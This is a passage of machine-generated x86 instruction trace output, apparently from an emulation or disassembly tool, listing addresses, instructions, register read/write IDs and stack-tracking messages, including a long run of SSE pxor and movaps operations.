[ebp - 0xfdc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x20 and offset 0x7024 for stack size 0x10000 saving data to stack: 4100 4 0x422333: mov dword ptr [ebp - 0xfd8], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x7028 for stack size 0x10000 saving data to stack: 0 4 0x422342: push edi, regs_read: [30, 23], regs_write: [30] 0x422343: mov edi, esi, regs_read: [29], regs_write: [23] 0x422357: push 0x400, regs_read: [30], regs_write: [30] 0x422362: push edi, regs_read: [30, 23], regs_write: [30] 0x422363: push eax, regs_read: [30, 19], regs_write: [30] 0x422369: push 0x400, regs_read: [30], regs_write: [30] 0x422374: push edi, regs_read: [30, 23], regs_write: [30] 0x422375: push eax, regs_read: [30, 19], regs_write: [30] 0x422381: push eax, regs_read: [30, 19], regs_write: [30] 0x422388: push eax, regs_read: [30, 19], regs_write: [30] 0x42238f: push eax, regs_read: [30, 19], regs_write: [30] 0x42239b: push eax, regs_read: [30, 19], regs_write: [30] 0x4223a2: push eax, regs_read: [30, 19], regs_write: [30] 0x4223a9: push eax, regs_read: [30, 19], regs_write: [30] 0x4223b2: mov eax, dword ptr [ebp + edi*8 - 0x404], regs_read: [20, 23], regs_write: [19] 0x4223b9: mov ecx, dword ptr [ebp + edi*8 - 0x400], regs_read: [20, 23], regs_write: [22] 0x4223c0: mov dword ptr [ebx + esi*8], eax, regs_read: [21, 29, 19], regs_write: () 0x4223c3: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x54 and offset 0x8008 for stack size 0x10000 0x4223c6: mov dword ptr [ebx + esi*8 + 4], ecx, regs_read: [21, 29, 22], regs_write: () 0x4223d4: pop edi, regs_read: [30], regs_write: [30, 23] 0x4223d5: pop esi, regs_read: [30], regs_write: [30, 29] 0x4223d6: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x4c and offset 0x7ffc for stack size 0x10000 0x4223db: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4223e1: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x48 and offset 0x8000 for stack size 0x10000 0x4223e3: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4223f0: push ebp, regs_read: [30, 20], regs_write: [30] 0x4223f1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4223f3: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x4223f6: push ebx, regs_read: [30, 21], regs_write: [30] 0x4223f7: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x800c for stack size 0x10000 0x4223fa: push esi, regs_read: [30, 29], regs_write: [30] 0x4223fb: push edi, regs_read: [30, 23], regs_write: [30] 0x422404: mov al, byte ptr [ebx + 8], regs_read: [21], regs_write: [2] 0x422407: mov esi, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [29] 0x422433: mov ecx, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [22] 0x422436: mov esi, dword ptr [edx + 0x18], regs_read: [24], regs_write: [29] 0x422440: mov esi, dword ptr [edi], regs_read: [23], regs_write: [29] 0x422442: mov eax, esi, regs_read: [29], regs_write: [19] 0x422452: mov eax, 0x18, regs_read: (), regs_write: [19] 0x422459: push 0, regs_read: [30], regs_write: [30] 0x42245b: mov dword ptr [ebp + 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x10 and offset 0x800c for stack size 0x10000 saving data to stack: 24 4 0x42245e: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x8010 for stack size 0x10000 0x422461: push eax, regs_read: [30, 19], regs_write: [30] 0x422462: push 0, regs_read: [30], regs_write: [30] 0x422464: push eax, regs_read: [30, 19], regs_write: [30] 0x42246a: mov eax, edx, regs_read: [24], regs_write: [19] 0x422477: mov dword ptr [ebp + 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x8008 for stack size 0x10000 saving data to stack: 0 4 0x42247e: mov al, byte ptr [ebx + 8], regs_read: [21], regs_write: [2] 0x42248c: mov edx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x800c for stack size 0x10000 0x422491: push 0, regs_read: [30], regs_write: [30] 0x422495: push dword ptr [edx], regs_read: [30, 24], regs_write: [30] 0x42249a: push eax, regs_read: [30, 19], regs_write: [30] 0x42249b: push ecx, regs_read: [30, 22], regs_write: [30] 0x4224a1: pop edi, regs_read: [30], regs_write: [30, 23] 0x4224a2: pop esi, regs_read: [30], regs_write: [30, 29] 0x4224a3: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4224a4: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4224b0: push ebp, regs_read: [30, 20], regs_write: [30] 0x4224b1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x20 and offset 0x8000 for stack size 0x10000 0x4224b3: mov edx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x20 and offset 0x800c for stack size 0x10000 0x4224b6: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x20 and offset 0x8008 for stack size 0x10000 0x4224b9: push esi, regs_read: [30, 29], regs_write: [30] 0x4224d0: mov esi, 0x80, regs_read: (), regs_write: [29] 0x4224d5: mov ecx, dword ptr [eax + edx], regs_read: [19, 24], regs_write: [22] 0x4224de: mov ecx, dword ptr [eax + edx - 4], regs_read: [19, 24], regs_write: [22] 0x4224ea: pop esi, regs_read: [30], regs_write: [30, 29] 0x4224eb: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4224f5: mov eax, 0x10, regs_read: (), regs_write: [19] 0x42250e: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x42251f: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x42252f: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x42253f: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x42254c: pop esi, regs_read: [30], regs_write: [30, 29] 0x42254d: pop ebp, regs_read: [30], regs_write: [30, 20] 0x422550: push ebx, regs_read: [30, 21], regs_write: [30] 0x422551: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x42255c: push ebp, regs_read: [30, 20], regs_write: [30] 0x42255d: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x422560: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP -0x1c and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x422564: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1c and offset 0x8000 for stack size 0x10000 0x42256c: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x422573: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ffc for stack size 0x10000 saving data to stack: 16 4 0x42257a: push esi, regs_read: [30, 29], regs_write: [30] 0x42257b: mov esi, dword ptr [ebx + 8], regs_read: [21], regs_write: [29] 0x42257e: mov dword ptr [ebp - 0x434], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x20 and offset 0x7bcc for stack size 0x10000 saving data to stack: 128 4 0x422584: mov dword ptr [ebp - 0x438], 1, regs_read: [20], regs_write: () adjusting stack for ESP -0x20 and offset 0x7bc8 for stack size 0x10000 saving data to stack: 1 4 0x42258e: push edi, regs_read: [30, 23], regs_write: [30] 0x4225a2: mov edi, dword ptr [ebp - 0x420], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x24 and offset 0x7be0 for stack size 0x10000 0x4225b7: mov eax, dword ptr [esi + 4], regs_read: [29], regs_write: [19] 0x4225ba: mov dword ptr [ebp - 0x438], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x24 and offset 0x7bc8 for stack size 0x10000 saving data to stack: 0 4 0x4225c4: mov dword ptr [ebp - 0x43c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x24 and offset 0x7bc4 for stack size 0x10000 saving data to stack: 16 4 0x4225cc: mov eax, dword ptr [esi + 4], regs_read: [29], regs_write: [19] 0x4225cf: push eax, regs_read: [30, 19], regs_write: [30] 0x4225d0: mov dword ptr [ebp - 0x43c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x28 and offset 0x7bc4 for stack size 0x10000 saving data to stack: 16 4 0x4225dc: push eax, regs_read: [30, 19], regs_write: [30] 0x4225dd: push esi, regs_read: [30, 29], regs_write: [30] 0x4225e6: mov al, byte ptr [ebp - 0x418], regs_read: [20], regs_write: [2] adjusting stack for ESP -0x30 and offset 0x7be8 for stack size 0x10000 0x4225ee: mov dword ptr [ebp - 0x424], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bdc for stack size 0x10000 saving data to stack: 0 4 0x4225fa: mov edx, 2, regs_read: (), regs_write: [24] 0x422602: mov dword ptr [ebp - 0x424], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bdc for stack size 0x10000 saving data to stack: 0 4 0x422608: mov edx, dword ptr [esi + 0x14], regs_read: [29], regs_write: [24] 0x42260b: mov edi, dword ptr [esi + 0x18], regs_read: [29], regs_write: [23] 0x42260e: mov dword ptr [ebp - 0x430], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 2 4 0x42261a: mov edx, edi, regs_read: [23], regs_write: [24] 0x422627: mov dword ptr [ebp - 0x428], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bd8 for stack size 0x10000 saving data to stack: 2 4 0x42262d: mov eax, edx, regs_read: [24], regs_write: [19] 0x422635: mov edx, dword ptr [ebp - 0x428], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x30 and offset 0x7bd8 for stack size 0x10000 0x422642: mov eax, dword ptr [esi], regs_read: [29], regs_write: [19] 0x42264d: mov dword ptr [ebp - 0x42c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bd4 for stack size 0x10000 saving data to stack: 0 4 0x422653: mov esi, dword ptr [eax + 4], regs_read: [19], regs_write: [29] 0x422658: mov ecx, 0x100, regs_read: (), regs_write: [22] 0x42265f: mov edi, dword ptr [ebp - 0x424], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x30 and offset 0x7bdc for stack size 0x10000 0x422671: mov esi, dword ptr [ebp - 0x434], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x30 and offset 0x7bcc for stack size 0x10000 0x422677: mov eax, edx, regs_read: [24], regs_write: [19] 0x422679: mov ecx, dword ptr [ebp - 0x42c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x30 and offset 0x7bd4 for stack size 0x10000 0x422682: mov dword ptr [ebp - 0x424], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bdc for stack size 0x10000 saving data to stack: 16 4 0x422690: mov eax, dword ptr [esi + 0x18], regs_read: [29], regs_write: [19] 0x422693: mov dword ptr [ebp - 0x444], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bbc for stack size 0x10000 saving data to stack: 16 4 0x422699: mov eax, edx, regs_read: [24], regs_write: [19] 0x4226a8: mov ecx, dword ptr [ebp - 0x424], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x30 and offset 0x7bdc for stack size 0x10000 0x4226b4: mov dword ptr [ebp - 0x42c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bd4 for stack size 0x10000 saving data to stack: 16 4 0x4226c3: mov ecx, dword ptr [ebp - 0x43c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x30 and offset 0x7bc4 for stack size 0x10000 0x4226c9: mov eax, dword ptr [ecx + edi*8], regs_read: [22, 23], regs_write: [19] 0x4226cc: mov dword ptr [ebp - 0x440], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bc0 for stack size 0x10000 saving data to stack: 16 4 0x4226d2: mov eax, dword ptr [ecx + edi*8 + 4], regs_read: [22, 23], regs_write: [19] 0x4226d8: mov eax, dword ptr [esi], regs_read: [29], regs_write: [19] 0x4226da: mov eax, dword ptr [eax + 4], regs_read: [19], regs_write: [19] 0x4226dd: mov edx, dword ptr [ecx + eax], regs_read: [22, 19], regs_write: [24] 0x4226e0: mov eax, dword ptr [ecx + eax + 4], regs_read: [22, 19], regs_write: [19] 0x4226e4: mov dword ptr [ebp - 0x440], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x30 and offset 0x7bc0 for stack size 0x10000 saving data to stack: 2 4 0x4226ea: push 0, regs_read: [30], regs_write: [30] 0x4226ec: push dword ptr [esi + 0x1c], regs_read: [30, 29], regs_write: [30] 0x4226ef: push 0, regs_read: [30], regs_write: [30] 0x4226f1: push eax, regs_read: [30, 19], regs_write: [30] 0x4226fe: mov dword ptr [ebp - 0x430], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x40 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 16 4 0x42270f: mov eax, dword ptr [ebp - 0x41c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x40 and offset 0x7be4 for stack size 0x10000 0x422715: mov ecx, 1, regs_read: (), regs_write: [22] 0x42271a: mov dword ptr [ebp - 0x430], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x40 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 16 4 0x422720: mov dword ptr [ebp - 0x44c], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x40 and offset 0x7bb4 for stack size 0x10000 saving data to stack: 0 4 0x42272a: mov dword ptr [ebp - 0x414], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x40 and offset 0x7bec for stack size 0x10000 saving data to stack: 0 4 0x422732: mov dword ptr [ebp - 0x414], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x40 and offset 0x7bec for stack size 0x10000 saving data to stack: 0 4 0x42274b: mov eax, dword ptr [esi], regs_read: [29], regs_write: [19] 0x42274d: push ecx, regs_read: [30, 22], regs_write: [30] 0x42274e: push dword ptr [ebp - 0x440], regs_read: [30, 20], regs_write: [30] 0x422754: mov esi, dword ptr [eax + 4], regs_read: [19], regs_write: [29] 0x42275d: push eax, regs_read: [30, 19], regs_write: [30] 0x42275e: push dword ptr [ebp - 0x434], regs_read: [30, 20], regs_write: [30] 0x422769: mov ecx, dword ptr [ebp - 0x444], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x50 and offset 0x7bbc for stack size 0x10000 0x42277b: mov ecx, dword ptr [ebp - 0x424], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x50 and offset 0x7bdc for stack size 0x10000 0x42278f: push ecx, regs_read: [30, 22], regs_write: [30] 0x422790: push eax, regs_read: [30, 19], regs_write: [30] 0x422797: push eax, regs_read: [30, 19], regs_write: [30] 0x4227a6: mov esi, dword ptr [ebp - 0x434], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x5c and offset 0x7bcc for stack size 0x10000 0x4227ad: mov edx, dword ptr [ebp - 0x428], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x5c and offset 0x7bd8 for stack size 0x10000 0x4227b6: mov ecx, dword ptr [ebp - 0x42c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x5c and offset 0x7bd4 for stack size 0x10000 0x4227cd: mov dword ptr [ebp - 0x428], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x5c and offset 0x7bd8 for stack size 0x10000 saving data to stack: 0 4 0x4227d3: mov dword ptr [ebp - 0x42c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x5c and offset 0x7bd4 for stack size 0x10000 saving data to stack: 0 4 0x4227e2: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x5c and offset 0x7ffc for stack size 0x10000 0x4227e5: pop edi, regs_read: [30], regs_write: [30, 23] 0x4227e8: pop esi, regs_read: [30], regs_write: [30, 29] 0x4227ee: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x54 and offset 0x8000 for stack size 0x10000 0x4227f0: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4227f1: mov esp, ebx, regs_read: [21], regs_write: [30] 0x4227f3: pop ebx, regs_read: [30], regs_write: [30, 21] 0x422800: push ebx, regs_read: [30, 21], regs_write: [30] 0x422801: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x42280c: push ebp, regs_read: [30, 20], regs_write: [30] 0x42280d: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x422810: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP 0x0 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x422814: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x42281c: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x422823: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 16 4 0x422826: mov ecx, dword ptr [ebx + 8], regs_read: [21], regs_write: [22] 0x422829: mov eax, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [19] 0x42282c: push esi, regs_read: [30, 29], regs_write: [30] 0x42282d: push edi, regs_read: [30, 23], regs_write: [30] 0x42282e: mov edi, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [23] 0x422837: mov dword ptr [ebp - 0x464], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b9c for stack size 0x10000 saving data to stack: 0 4 0x42283d: mov dword ptr [ebp - 0x474], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b8c for stack size 0x10000 saving data to stack: 16 4 0x422846: mov dword ptr [ebp - 0x470], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b90 for stack size 0x10000 saving data to stack: 0 4 0x42284f: mov dword ptr [ebp - 0x434], 0x10, regs_read: [20], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bcc for stack size 0x10000 saving data to stack: 16 4 0x42285b: mov dword ptr [ebx + 0xc], edi, regs_read: [21, 23], regs_write: () 0x42285e: mov edi, esi, regs_read: [29], regs_write: [23] 0x42286a: mov dword ptr [ebp - 0x468], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b98 for stack size 0x10000 saving data to stack: 0 4 0x422878: mov ecx, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [22] 0x42287b: mov dword ptr [ebp - 0x46c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b94 for stack size 0x10000 saving data to stack: 0 4 0x422881: mov esi, dword ptr [ebp - 0x464], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8 and offset 0x7b9c for stack size 0x10000 0x4228a4: pxor xmm0, xmmword ptr [eax - 0x50], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7fb0 for stack size 0x10000 0x4228b6: mov ecx, dword ptr [ebp - 0x468], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x7b98 for stack size 0x10000 0x4228bc: pxor xmm0, xmmword ptr [eax - 0x40], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7fc0 for stack size 0x10000 0x4228ce: pxor xmm0, xmmword ptr [eax - 0x30], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7fd0 for stack size 0x10000 0x4228d8: mov ecx, dword ptr [ebp - 0x46c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x7b94 for stack size 0x10000 0x4228e6: pxor xmm0, xmmword ptr [eax - 0x20], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7fe0 for stack size 0x10000 0x4228f0: mov ecx, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [22] 0x4228f9: mov ecx, dword ptr [ebp - 0x470], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x7b90 for stack size 0x10000 0x4228ff: mov edx, 8, regs_read: (), regs_write: [24] 0x42291b: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x422932: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x422935: movaps xmmword ptr [ebp - 0x490], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b70 for stack size 0x10000 saving data to stack: 0 16 0x42294c: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x42294f: pxor xmm0, xmmword ptr [eax + 0x40], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8040 for stack size 0x10000 0x422959: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x42295c: pxor xmm0, xmmword ptr [eax + 0x50], regs_read: [122, 19], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8050 for stack size 0x10000 0x422961: movaps xmmword ptr [ebp - 0x450], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 saving data to stack: 0 16 0x422971: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x422988: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x42298b: movaps xmm5, xmm7, regs_read: [129], regs_write: [127] 0x422996: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4229ab: movaps xmm0, xmmword ptr [ebp - 0x490], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7b70 for stack size 0x10000 0x4229b2: movaps xmm2, xmm6, regs_read: [128], regs_write: [124] 0x4229b5: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x4229b9: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4229d5: movaps xmm0, xmmword ptr [ebp - 0x450], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 0x4229dc: movaps xmmword ptr [ebp - 0x420], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x4229e3: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4229f6: movaps xmm0, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x4229fd: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422a01: movaps xmmword ptr [ebp - 0x460], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x422a11: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x422a14: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x422a17: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422a1b: movaps xmmword ptr [ebp - 0x450], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 saving data to stack: 0 16 0x422a2b: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x422a4e: movaps xmmword ptr [ebp - 0x490], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7b70 for stack size 0x10000 saving data to stack: 0 16 0x422a55: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x422a58: movaps xmmword ptr [ebp - 0x430], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x422a5f: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422a63: pxor xmm1, xmm2, regs_read: [123, 124], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422a67: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x422a6a: movaps xmm6, xmm1, regs_read: [123], regs_write: [128] 0x422a76: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422a7e: movaps xmm0, xmmword ptr [ebp - 0x450], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 0x422a8a: movaps xmm4, xmm2, regs_read: [124], regs_write: [126] 0x422a8d: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422a91: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x422aa0: movaps xmm2, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x422aa7: movaps xmm5, xmm2, regs_read: [124], regs_write: [127] 0x422abe: movaps xmm3, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x422acd: movaps xmm2, xmmword ptr [ebp - 0x460], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x422ad4: movaps xmm7, xmm2, regs_read: [124], regs_write: [129] 0x422ad7: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422af0: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x422af3: movaps xmmword ptr [ebp - 0x460], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 saving data to stack: 0 16 0x422afa: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422afe: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x422b09: movaps xmm2, xmmword ptr [ebp - 0x490], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x8 and offset 0x7b70 for stack size 0x10000 0x422b21: movaps xmm3, xmmword ptr [ebp - 0x490], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x7b70 for stack size 0x10000 0x422b2c: movaps xmmword ptr [ebp - 0x450], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 saving data to stack: 0 16 0x422b3b: movaps xmmword ptr [ebp - 0x430], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x422b42: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x422b45: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422b49: movaps xmm6, xmmword ptr [ebp - 0x430], regs_read: [20], regs_write: [128] adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 0x422b59: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x422b5c: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422b60: movaps xmm4, xmm5, regs_read: [127], regs_write: [126] 0x422b7c: movaps xmmword ptr [ebp - 0x420], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 saving data to stack: 0 16 0x422b87: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x422b9a: movaps xmm7, xmmword ptr [ebp - 0x420], regs_read: [20], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x7be0 for stack size 0x10000 0x422ba1: pxor xmm7, xmmword ptr [ebp - 0x460], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP -0x8 and offset 0x7ba0 for stack size 0x10000 0x422bb6: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x422bc3: movaps xmm0, xmmword ptr [ebp - 0x450], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x8 and offset 0x7bb0 for stack size 0x10000 0x422bca: movaps xmmword ptr [ebp - 0x430], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x8 and offset 0x7bd0 for stack size 0x10000 saving data to stack: 0 16 0x422bd1: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x422bdc: movaps xmmword ptr [ebp - 0x420], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 